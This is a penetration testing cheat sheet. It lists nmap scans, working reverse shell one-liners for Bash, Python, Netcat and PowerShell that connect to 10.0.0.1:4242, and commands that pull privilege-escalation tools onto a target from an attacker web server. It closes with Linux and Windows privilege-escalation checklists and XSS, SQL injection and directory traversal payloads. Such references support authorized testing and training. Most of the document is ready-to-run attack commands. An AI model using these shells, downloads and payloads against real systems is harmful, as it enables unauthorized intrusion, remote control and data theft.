# Comprehensive Penetration Testing Cheat Sheet

## Nmap Quick Reference
- `nmap -sC -sV -oA target 192.168.1.1` (Default scripts, version detection, output all formats)
- `nmap -p- -T4 192.168.1.1` (Scan all 65535 ports fast)
- `nmap --script vuln 192.168.1.1` (Run vulnerability detection scripts)

## Reverse Shell One-Liners
**Bash:**
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**Netcat:**
```bash
nc -e /bin/sh 10.0.0.1 4242
```
**PowerShell:**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## File Transfer Methods
**Attacker serving files:**
```bash
python3 -m http.server 80
```
**Target downloading files:**
- Linux: `wget http://10.0.0.1/linpeas.sh` or `curl -O http://10.0.0.1/linpeas.sh`
- Windows: `certutil -urlcache -split -f http://10.0.0.1/winpeas.exe`
- Windows (PS): `Invoke-WebRequest -Uri http://10.0.0.1/winpeas.exe -OutFile winpeas.exe`

## Linux Privilege Escalation Checklist
1. `sudo -l` (What can I run as root?)
2. `find / -perm -u=s -type f 2>/dev/null` (Find SUID binaries)
3. Check `/etc/crontab`
4. `uname -a` (Kernel exploits?)
5. Run LinPEAS.

## Windows Privilege Escalation Checklist
1. `whoami /priv` (Check privileges like SeImpersonatePrivilege)
2. `systeminfo` (OS Version, patches)
3. Unquoted Service Paths / Weak Registry Permissions.
4. Run WinPEAS.

## Web Application Checklist
1. Map application (spidering/crawling).
2. Test inputs for XSS (`<script>alert(1)</script>`).
3. Test inputs for SQLi (`'`, `' OR '1'='1`).
4. Test ID parameters for IDOR (change `id=1` to `id=2`).
5. Check directory traversal (`../../etc/passwd`).
